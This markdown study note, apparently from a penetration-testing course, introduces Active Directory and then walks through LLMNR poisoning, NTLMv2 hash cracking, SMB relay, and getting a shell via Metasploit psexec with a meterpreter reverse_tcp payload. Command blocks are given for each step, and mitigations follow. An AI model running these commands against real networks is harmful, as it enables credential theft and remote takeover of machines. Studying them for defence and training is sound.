# Active Directory

1. [Introduction](#introduction)
2. [Attacking Active Directory: Initial Attack Vectors](#attacking-active-directory-initial-attack-vectors)

## Introduction

* Active Directory (AD) - Directory service developed by Microsoft to manage Windows domain networks; authenticates using Kerberos tickets.

* Physical AD components:

  * Domain Controller - server with AD DS (Active Directory Domain Services) server role installed; hosts a copy of the AD DS directory store and provides authentication & authorization services; admin access.

  * AD DS Data Store - contains database files and processes that store, manage directory info for users, services, apps; consists of Ntds.dit file.

* Logical AD components:

  * AD DS Schema - enforces rules regarding object creation and configuration.

  * Domains - used to group and manage objects in an organization.

  * Trees - hierarchy of domains in AD DS.

  * Forests - collection of domain trees.

  * Organizational Units (OUs) - AD containers that can contain users, groups, containers and other OUs.

  * Trusts - mechanism for users to gain access to resources in another domain; can be directional or transitive.

  * Objects - user, groups, contacts, computers, etc.; everything inside a domain.

## Attacking Active Directory: Initial Attack Vectors

* [This article](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa) covers some common ways to attack active directory computers and get domain admin.

* LLMNR Poisoning:

  * LLMNR (Link-Local Multicast Name Resolution) is used to identify hosts when DNS fails; previously NBT-NS

  * Flaw is that services utilize username and NTLMv2 hash when aptly responded to.

  * Steps:

    * Run Responder tool in Kali

    ```shell
    ip a
    #note interface

    python Responder.py -I eth0 -rdw
    ```

    * Event occurs in Windows

    * Obtain hashes and crack them using Hashcat

    ```shell
    hashcat -m 5600 ntlmhash.txt rockyou.txt
    #-m 5600 for NTLMv2
    #ntlmhash.txt contains the hashes
    ```

  * Mitigation:

    * Disable LLMNR and NBT-NS

    * Require Network Access Control

    * Use strong password policy

* SMB Relay:

  * Instead of cracking hashes gathered with Responder, we can relay those hashes to specific machines and gain access.

  * Requirements:

    * SMB signing must be disabled on target
    * Relayed user creds must be admin on machine

  * Steps:

    * Discover hosts with SMB signing disabled

    ```shell
    nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
    #we need to note down machines with 'message signing enabled but not required'

    vim targets.txt
    #add target IPs
    ```

    * Edit Responder config - turn SMB and HTTP off

    ```shell
    vim /etc/responder/Responder.conf
    #turn SMB, HTTP off
    ```

    * Run Responder tool

    ```shell
    python Responder.py -I eth0 -rdw
    ```

    * Setup relay

    ```shell
    python ntlmrelayx.py -tf targets.txt -smb2support

    #trigger connection in Windows machine
    #by pointing it at the attacker machine

    #-i option can be used for an interactive shell
    ```

    * Event occurs in Windows machine

    * Credentials are captured (and saved) and we get access to machine

  * Mitigation:

    * Enable SMB signing on all devices

    * Disable NTLM authentication on network

    * Account tiering

    * Local admin restriction (to prevent lateral movement)

* Gaining Shell Access:

```shell
#this step has to be done once we have the credentials
msfconsole

search psexec

use exploit/windows/smb/psexec

options
#set all required options
#such as RHOSTS, smbdomain, smbpass and smbuser

set payload windows/x64/meterpreter/reverse_tcp

set LHOST eth0

run
#run exploit
```

```shell
#we can use another tool called psexec.py
psexec.py marvel.local/fcastle:Password1@192.168.57.141

#try multiple options if these tools do not work
#such as smbexec and wmiexec
```